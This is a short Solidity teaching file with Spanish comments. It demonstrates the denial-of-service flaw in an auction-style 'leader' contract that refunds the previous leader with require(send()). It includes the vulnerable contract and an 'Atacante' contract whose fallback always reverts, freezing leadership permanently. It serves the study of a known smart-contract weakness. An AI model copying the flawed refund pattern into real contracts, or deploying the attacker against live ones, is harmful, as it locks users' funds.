pragma solidity ^0.4.18;

/**
 * vuelve al contrato inutilizable porque nadie va a poder hacerse lider
 */

contract CallToTheUnknown {

    address public liderActual = 0;
    uint precioMayor;

    function() payable {
        require(msg.value > precioMayor);
        require(liderActual.send(precioMayor)); 
        liderActual = msg.sender;
        precioMayor = msg.value;
    }
}

contract Bueno {
  function hacerseLider(address _address) public payable{
    _address.call.value(msg.value)();
  }
    
  function() payable {
    
  }
}

contract Atacante {
  function hacerseLider(address _address) payable{
    _address.call.value(msg.value)();
  }
    
  function() payable {
    revert();
  }
}